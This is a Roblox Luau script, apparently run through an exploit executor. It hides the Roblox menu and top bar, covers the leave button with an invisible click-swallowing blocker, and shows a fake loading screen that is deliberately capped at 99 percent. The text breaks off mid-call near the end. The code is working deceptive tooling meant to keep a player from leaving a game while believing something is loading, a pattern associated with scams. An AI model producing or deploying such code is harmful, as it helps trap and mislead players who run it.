pcall(function()
	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
		game.CoreGui.AntiLeaveBlocker:Destroy()
	end
end)


local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000


local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")


local function tryHideRobloxMenu()
	pcall(function()
		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
		for _, n in ipairs(names) do
			local g = CoreGui:FindFirstChild(n)
			if g then
				pcall(function()
					if g:IsA("ScreenGui") then
						g.Enabled = false
						for _, c in ipairs(g:GetChildren()) do
							pcall(function() c.Visible = false end)
							pcall(function() c.Enabled = false end)
						end
					else
						for _, c in ipairs(g:GetDescendants()) do
							pcall(function()
								if c:IsA("GuiObject") then
									c.Position = UDim2.new(-10,0,-10,0)
								end
							end)
						end
					end
				end)
			end
		end
	end)
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)


RunService.RenderStepped:Connect(function()
	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)


spawn(function()
	while screenGui.Parent and screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		wait(2)
	end
end)


-- Infinite 1–99% Loading Screen (LuaU)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "StuckLoadingUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

-- Dark overlay
local overlay = Instance.new("Frame")
overlay.Size = UDim2.fromScale(1, 1)
overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
overlay.BackgroundTransparency = 0.25
overlay.Parent = gui

-- Loading box
local box = Instance.new("Frame")
box.Size = UDim2.new(0, 420, 0, 130)
box.Position = UDim2.fromScale(0.5, 0.6)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
box.BorderSizePixel = 0
box.Parent = overlay

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = box

-- "LOADING" text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 30)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "LOADING"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = box

-- Progress bar background
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(1, -20, 0, 8)
barBG.Position = UDim2.new(0, 10, 0, 55)
barBG.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
barBG.BorderSizePixel = 0
barBG.Parent = box

local barBGCorner = Instance.new("UICorner")
barBGCorner.CornerRadius = UDim.new(1, 0)
barBGCorner.Parent = barBG

-- Progress bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0.01, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(80, 150, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBG

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

-- Percent / status text
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 0, 30)
status.Position = UDim2.new(0, 10, 0, 75)
status.BackgroundTransparency = 1
status.Text = "1%  Initializing..."
status.TextColor3 = Color3.fromRGB(180, 180, 180)
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = box

-- Progress logic (never reaches 100%)
task.spawn(function()
	local percent = 1

	while true do
		if percent < 99 then
			percent += math.random(1, 3)
			if percent > 99 then
				percent = 99
			end
		end

		status.Text = percent .. "%  Finalizing..."

		TweenService:Create(
			barFill,
			TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{ Size = UDim2.new(percent / 100, 0, 1, 0) }
		):Play()

		task.wait(